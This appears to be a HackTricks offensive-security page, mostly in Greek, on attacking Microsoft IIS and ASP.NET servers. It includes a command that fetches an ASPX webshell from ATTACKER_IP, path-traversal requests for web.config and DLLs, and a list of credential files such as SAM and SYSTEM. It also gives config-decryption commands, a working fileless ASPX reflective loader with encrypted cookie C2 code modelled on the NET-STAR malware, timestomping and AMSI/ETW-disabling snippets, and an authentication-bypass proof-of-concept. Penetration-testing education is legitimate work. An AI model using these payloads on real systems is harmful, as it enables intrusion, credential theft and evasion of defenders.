# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

Test executable file extensions:

- asp
- aspx
- config
- php

## Εγγράψιμο webroot → ASPX command shell

Εάν ένας χρήστης/ομάδα με χαμηλά προνόμια έχει **άδεια εγγραφής στο `C:\inetpub\wwwroot`**, μπορείτε να ανεβάσετε ένα ASPX webshell και να εκτελέσετε εντολές του λειτουργικού συστήματος ως η ταυτότητα του application pool (συχνά διαθέτοντας **SeImpersonatePrivilege**).

- Επαληθεύστε τα ACLs: `icacls C:\inetpub\wwwroot` or `cacls .` αναζητώντας `(F)` για τον χρήστη/την ομάδα σας.
- Μεταφορτώστε ένα command webshell (π.χ. fuzzdb/tennc `cmd.aspx`) χρησιμοποιώντας PowerShell:
```powershell
iwr http://ATTACKER_IP/shell.aspx -OutFile C:\inetpub\wwwroot\shell.aspx
```
- Στείλτε αίτημα στο `/shell.aspx` και εκτελέστε εντολές· η ταυτότητα συνήθως εμφανίζεται ως `iis apppool\defaultapppool`.
- Συνδυάστε με Potato-family LPE (π.χ., GodPotato/SigmaPotato) όταν το AppPool token έχει SeImpersonatePrivilege για pivot σε SYSTEM.

## Αποκάλυψη εσωτερικής διεύθυνσης IP

Σε οποιονδήποτε IIS server όπου λαμβάνετε 302 μπορείτε να δοκιμάσετε να αφαιρέσετε το Host header και να χρησιμοποιήσετε HTTP/1.0 — μέσα στην απάντηση το Location header μπορεί να δείχνει την εσωτερική διεύθυνση IP:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Απάντηση που αποκαλύπτει την εσωτερική IP:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Execute .config files

Μπορείτε να ανεβάσετε αρχεία .config και να τα χρησιμοποιήσετε για να εκτελέσετε κώδικα. Ένας τρόπος είναι να προσθέσετε τον κώδικα στο τέλος του αρχείου μέσα σε ένα HTML σχόλιο: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Περισσότερες πληροφορίες και τεχνικές για να εκμεταλλευτείτε αυτήν την ευπάθεια [here](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

Κατεβάστε τη λίστα που έχω δημιουργήσει:

{{#file}}
iisfinal.txt
{{#endfile}}

Δημιουργήθηκε συνενώνοντας τα περιεχόμενα των παρακάτω λιστών:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Χρησιμοποιήστε την χωρίς να προσθέσετε κάποια επέκταση, τα αρχεία που τη χρειάζονται την έχουν ήδη.

## Path Traversal

### Leaking source code

Δείτε την πλήρη περιγραφή στο: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> Συνοπτικά, υπάρχουν πολλά αρχεία web.config μέσα στους φακέλους της εφαρμογής με αναφορές σε "**assemblyIdentity**" αρχεία και σε "**namespaces**". Με αυτές τις πληροφορίες είναι δυνατόν να γνωρίζετε **πού βρίσκονται τα εκτελέσιμα αρχεία** και να τα κατεβάσετε.\
> Από τα **downloaded Dlls** είναι επίσης δυνατό να βρεθούν **νέα namespaces** όπου θα πρέπει να προσπαθήσετε να αποκτήσετε πρόσβαση και να πάρετε το αρχείο web.config ώστε να βρείτε νέες namespaces και assemblyIdentity.\
> Επίσης, τα αρχεία **connectionstrings.config** και **global.asax** μπορεί να περιέχουν ενδιαφέρουσες πληροφορίες.

Σε **.Net MVC applications**, το **web.config** αρχείο παίζει κρίσιμο ρόλο καθορίζοντας κάθε δυαδικό αρχείο στο οποίο στηρίζεται η εφαρμογή μέσω των XML ετικετών **"assemblyIdentity"**.

### **Exploring Binary Files**

Ακολουθεί παράδειγμα πρόσβασης στο αρχείο **web.config**:
```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Αυτό το αίτημα αποκαλύπτει διάφορες ρυθμίσεις και εξαρτήσεις, όπως:

- **EntityFramework** έκδοση
- **AppSettings** για webpages, επικύρωση πελάτη και JavaScript
- **System.web** διαμορφώσεις για authentication και runtime
- **System.webServer** ρυθμίσεις modules
- **Runtime** assembly bindings για πολλές βιβλιοθήκες όπως **Microsoft.Owin**, **Newtonsoft.Json**, και **System.Web.Mvc**

Αυτές οι ρυθμίσεις υποδεικνύουν ότι ορισμένα αρχεία, όπως **/bin/WebGrease.dll**, βρίσκονται μέσα στον φάκελο /bin της εφαρμογής.

### **Root Directory Files**

Τα αρχεία που βρίσκονται στον root κατάλογο, όπως **/global.asax** και **/connectionstrings.config** (που περιέχει ευαίσθητους κωδικούς πρόσβασης), είναι απαραίτητα για τη ρύθμιση και τη λειτουργία της εφαρμογής.

### **Namespaces and Web.Config**

Οι εφαρμογές MVC ορίζουν επίσης επιπλέον **web.config files** για συγκεκριμένα namespaces για να αποφευχθούν επαναλαμβανόμενες δηλώσεις σε κάθε αρχείο, όπως φαίνεται με ένα αίτημα για λήψη ενός άλλου **web.config**:
```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Λήψη DLLs**

Η αναφορά σε ένα custom namespace υποδηλώνει ένα DLL με όνομα "**WebApplication1**" που υπάρχει στον κατάλογο /bin. Ακολουθεί ένα αίτημα για λήψη του **WebApplication1.dll**:
```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Αυτό υποδηλώνει την παρουσία άλλων απαραίτητων DLL, όπως **System.Web.Mvc.dll** και **System.Web.Optimization.dll**, στον φάκελο /bin.

Σε ένα σενάριο όπου ένα DLL εισάγει ένα namespace που ονομάζεται **WebApplication1.Areas.Minded**, ένας attacker μπορεί να συμπεράνει την ύπαρξη άλλων web.config αρχείων σε προβλέψιμες διαδρομές, όπως **/area-name/Views/**, που περιέχουν συγκεκριμένες ρυθμίσεις και αναφορές σε άλλα DLL στον φάκελο /bin. Για παράδειγμα, ένα αίτημα προς **/Minded/Views/web.config** μπορεί να αποκαλύψει ρυθμίσεις και namespaces που υποδηλώνουν την παρουσία ενός άλλου DLL, **WebApplication1.AdditionalFeatures.dll**.

### Κοινά αρχεία

Από [here](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Error

If you see an error like the following one:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

It means that the server **δεν έλαβε το σωστό domain name** inside the Host header.\
In order to access the web page you could take a look to the served **SSL Certificate** and maybe you can find the domain/subdomain name in there. If it isn't there you may need to **brute force VHosts** until you find the correct one.

## Αποκρυπτογράφηση κρυπτογραφημένης διαμόρφωσης και ASP.NET Core Data Protection key rings

Two common patterns to protect secrets on IIS-hosted .NET apps are:
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) για τμήματα του web.config όπως <connectionStrings>.
- ASP.NET Core Data Protection key ring (persisted locally) που χρησιμοποιείται για την προστασία μυστικών εφαρμογής και cookies.

If you have filesystem or interactive access on the web server, co-located keys often allow decryption.

- ASP.NET (Full Framework) – decrypt protected config sections with aspnet_regiis:
```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```
- ASP.NET Core – αναζητήστε Data Protection key rings αποθηκευμένα τοπικά (XML/JSON files) σε τοποθεσίες όπως:
- %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
- HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
- App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

Με το key ring διαθέσιμο, ένας operator που τρέχει με την ταυτότητα της εφαρμογής μπορεί να instantiate ένα IDataProtector με τις ίδιες purposes και να unprotect τα αποθηκευμένα secrets. Misconfigurations που αποθηκεύουν το key ring μαζί με τα αρχεία της εφαρμογής κάνουν το offline decryption πολύ εύκολο μόλις ο host έχει συμβιβαστεί.

## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)

Το Phantom Taurus/NET-STAR toolkit παρουσιάζει ένα ώριμο pattern για fileless IIS persistence και post‑exploitation εντελώς μέσα στο w3wp.exe. Οι βασικές ιδέες είναι ευρέως επαναχρησιμοποιήσιμες για custom tradecraft και για detection/hunting.

Key building blocks
- ASPX bootstrapper hosting an embedded payload: μία μόνο .aspx σελίδα (π.χ., OutlookEN.aspx) περιέχει ένα Base64‑encoded, προαιρετικά Gzip‑compressed .NET DLL. Μετά από trigger request αποκωδικοποιεί, αποσυμπιέζει και reflectively φορτώνει το DLL στο τρέχον AppDomain και καλεί το main entry point (π.χ., ServerRun.Run()).
- Cookie‑scoped, encrypted C2 with multi‑stage packing: tasks/results τυλίγονται με Gzip → AES‑ECB/PKCS7 → Base64 και μεταφέρονται μέσω φαινομενικά νόμιμων cookie‑heavy requests· οι operators χρησιμοποιούσαν σταθερούς delimiters (π.χ., "STAR") για chunking.
- Reflective .NET execution: δέχεται αυθαίρετες managed assemblies ως Base64, φορτώνει μέσω Assembly.Load(byte[]) και περνά operator args για γρήγορο module swaps χωρίς να αγγίζει το disk.
- Operating in precompiled ASP.NET sites: προσθέτει/διαχειρίζεται auxiliary shells/backdoors ακόμα και όταν ο ιστότοπος είναι precompiled (π.χ., dropper προσθέτει dynamic pages/handlers ή αξιοποιεί config handlers) – εκτίθεται μέσω εντολών όπως bypassPrecompiledApp, addshell, listshell, removeshell.
- Timestomping/metadata forgery: παρέχει μια changeLastModified action και κάνει timestomp κατά την deployment (συμπεριλαμβανομένων μελλοντικών compilation timestamps) για να δυσκολέψει το DFIR.
- Optional AMSI/ETW pre‑disable for loaders: ένας second‑stage loader μπορεί να απενεργοποιήσει AMSI και ETW πριν καλέσει Assembly.Load για να μειώσει την επιθεώρηση των in‑memory payloads.

Minimal ASPX loader pattern
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
// 1) Obtain payload bytes (hard‑coded blob or from request)
string b64 = /* hardcoded or Request["d"] */;
byte[] blob = Convert.FromBase64String(b64);
// optional: decrypt here if AES is used
using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
using(var ms = new MemoryStream()){
gz.CopyTo(ms);
var asm = Assembly.Load(ms.ToArray());
// 2) Invoke the managed entry point (e.g., ServerRun.Run)
var t = asm.GetType("ServerRun");
var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
object inst = m.IsStatic ? null : Activator.CreateInstance(t);
m.Invoke(inst, new object[]{ HttpContext.Current });
}
}
}
</script>
```
Packing/crypto βοηθήματα (Gzip + AES‑ECB + Base64)
```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
using(var aes = Aes.Create()){
aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
return t.TransformFinalBlock(data, 0, data.Length);
}
}

static string Pack(object obj, byte[] key){
// serialize → gzip → AES‑ECB → Base64
byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
using var ms = new MemoryStream();
using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
byte[] enc = AesEcb(ms.ToArray(), key, true);
return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
byte[] enc = Convert.FromBase64String(b64);
byte[] cmp = AesEcb(enc, key, false);
using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
using var outMs = new MemoryStream(); gz.CopyTo(outMs);
return Deserialize<T>(outMs.ToArray());
}
```
Cookie/session ροή και επιφάνεια εντολών
- Η εκκίνηση της συνεδρίας (session bootstrap) και η ανάθεση εργασιών μεταφέρονται μέσω cookies ώστε να συγχωνευθούν με την κανονική δραστηριότητα του ιστού.
- Οι εντολές που παρατηρήθηκαν in the wild περιελάμβαναν: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; και τα dynamic execution primitives code_self, code_pid, run_code για εκτέλεση .NET στη μνήμη.

Timestomping utility
```csharp
File.SetCreationTime(path, ts);
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```
Ενσωματωμένη απενεργοποίηση AMSI/ETW πριν από Assembly.Load (loader variant)
```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```
Δείτε AMSI/ETW bypass techniques σε: windows-hardening/av-bypass.md

Σημειώσεις Hunting (αμυντές)
- Μία μοναδική, περίεργη σελίδα ASPX με πολύ μεγάλους Base64/Gzip blobs; αιτήσεις με πολλά cookies.
- Unbacked managed modules μέσα στο w3wp.exe; strings όπως Encrypt/Decrypt (ECB), Compress/Decompress, GetContext, Run.
- Επαναλαμβανόμενοι διαχωριστές όπως "STAR" στην κίνηση; μη ταιριασμένα ή ακόμη και μελλοντικά timestamps σε ASPX/assemblies.

## Telerik UI WebResource.axd unsafe reflection (CVE-2025-3600)

Πολλές εφαρμογές ASP.NET ενσωματώνουν το Telerik UI for ASP.NET AJAX και εκθέτουν τον μη-αυθεντικοποιημένο handler Telerik.Web.UI.WebResource.axd. Όταν το Image Editor cache endpoint είναι προσβάσιμο (type=iec), οι παράμετροι dkey=1 και prtype ενεργοποιούν unsafe reflection που εκτελεί οποιονδήποτε δημόσιο constructor χωρίς παραμέτρους προ‑auth. Αυτό παρέχει ένα καθολικό DoS primitive και μπορεί να κλιμακωθεί σε pre‑auth RCE σε εφαρμογές με μη ασφαλείς handlers AppDomain.AssemblyResolve.

Δείτε λεπτομερείς τεχνικές και PoCs εδώ:

{{#ref}}
telerik-ui-aspnet-ajax-unsafe-reflection-webresource-axd.md
{{#endref}}

## Old IIS vulnerabilities worth looking for


### Microsoft IIS tilde character “\~” Vulnerability/Feature – Short File/Folder Name Disclosure

Μπορείτε να δοκιμάσετε να enumerate φακέλους και αρχεία μέσα σε κάθε εντοπισμένο φάκελο (ακόμα κι αν απαιτεί Basic Authentication) χρησιμοποιώντας αυτήν την τεχνική.\
Ο βασικός περιορισμός αυτής της τεχνικής, αν ο server είναι ευάλωτος, είναι ότι μπορεί να βρει μόνο έως τα πρώτα 6 γράμματα του ονόματος κάθε αρχείου/φακέλου και τα πρώτα 3 γράμματα της επέκτασης των αρχείων.

Μπορείτε να χρησιμοποιήσετε [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) για να δοκιμάσετε αυτή την ευπάθεια:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

Αρχική έρευνα: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

Μπορείτε επίσης να χρησιμοποιήσετε metasploit: `use scanner/http/iis_shortname_scanner`

Μια ωραία ιδέα για να βρείτε το τελικό όνομα των εντοπισμένων αρχείων είναι να ρωτήσετε LLMs για επιλογές, όπως γίνεται στο script [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py)

### Basic Authentication bypass

Παρακάμψτε μια basic authentication (IIS 7.5) προσπαθώντας να αποκτήσετε πρόσβαση: `/admin:$i30:$INDEX_ALLOCATION/admin.php` ή `/admin::$INDEX_ALLOCATION/admin.php`

Μπορείτε να δοκιμάσετε να συνδυάσετε αυτή την ευπάθεια με την προηγούμενη για να βρείτε νέους φακέλους και να παρακάμψετε την authentication.

## ASP.NET Trace.AXD enabled debugging

Το ASP.NET περιλαμβάνει λειτουργία debugging και το αρχείο της ονομάζεται `trace.axd`.

Κρατά πολύ λεπτομερείς καταγραφές όλων των αιτήσεων που έγιναν προς μια εφαρμογή κατά τη διάρκεια ενός χρονικού διαστήματος.

Αυτές οι πληροφορίες περιλαμβάνουν απομακρυσμένες IP πελατών, session IDs, όλα τα request και response cookies, φυσικές διαδρομές, πληροφορίες πηγαίου κώδικα, και ενδεχομένως ακόμη και usernames και passwords.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

Η ASPXAUTH χρησιμοποιεί τις ακόλουθες πληροφορίες:

- **`validationKey`** (string): hex-encoded key to use for signature validation.
- **`decryptionMethod`** (string): (default “AES”).
- **`decryptionIV`** (string): hex-encoded initialization vector (defaults to a vector of zeros).
- **`decryptionKey`** (string): hex-encoded key to use for decryption.

Ωστόσο, κάποιοι θα χρησιμοποιήσουν τις default τιμές αυτών των παραμέτρων και θα χρησιμοποιήσουν ως cookie το email του χρήστη. Επομένως, αν βρείτε μια web εφαρμογή που χρησιμοποιεί την ίδια πλατφόρμα και χρησιμοποιεί το ASPXAUTH cookie, και δημιουργήσετε έναν χρήστη με το email του χρήστη που θέλετε να προσποιηθείτε στον server υπό επίθεση, μπορεί να καταφέρετε να χρησιμοποιήσετε το cookie από τον δεύτερο server στον πρώτο και να προσποιηθείτε τον χρήστη.\
Αυτή η επίθεση λειτούργησε σε αυτό το [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): Ένα bug στον κώδικα δεν έλεγχε σωστά τον κωδικό πρόσβασης που παρείχε ο χρήστης, οπότε ένας επιτιθέμενος του οποίου το password hash πέφτει σε ένα key που υπάρχει ήδη στην cache θα μπορεί να κάνει login ως αυτός ο χρήστης.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## Αναφορές

- [0xdf – HTB Job (IIS write → ASPX shell → GodPotato)](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Unit 42 – Phantom Taurus: A New Chinese Nexus APT and the Discovery of the NET-STAR Malware Suite](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [AMSI/ETW bypass υπόβαθρο (HackTricks)](../../windows-hardening/av-bypass.md)

{{#include ../../banners/hacktricks-training.md}}
